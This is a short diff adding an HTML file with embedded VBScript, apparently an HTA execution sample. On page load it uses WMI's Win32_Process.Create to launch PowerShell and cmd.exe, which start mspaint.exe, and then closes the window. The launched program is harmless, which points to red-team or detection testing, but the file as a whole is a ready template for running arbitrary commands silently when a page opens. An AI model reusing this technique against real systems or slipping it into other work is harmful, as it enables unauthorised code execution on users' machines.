@@ -1,0 +1,18 @@
+<html>
+<head>
+<script language="VBScript">
+Sub window_onload
+	const impersonation = 3
+	Const HIDDEN_WINDOW = 12
+	Set Locator = CreateObject("WbemScripting.SWbemLocator")
+	Set Service = Locator.ConnectServer()
+	Service.Security_.ImpersonationLevel=impersonation
+	Set objStartup = Service.Get("Win32_ProcessStartup")
+	Set objConfig = objStartup.SpawnInstance_
+	Set Process = Service.Get("Win32_Process")
+	Error = Process.Create("powershell -nop cmd.exe /c mspaint.exe", null, objConfig, intProcessID)
+	window.close()
+end sub
+</script>
+</head>
+</html>
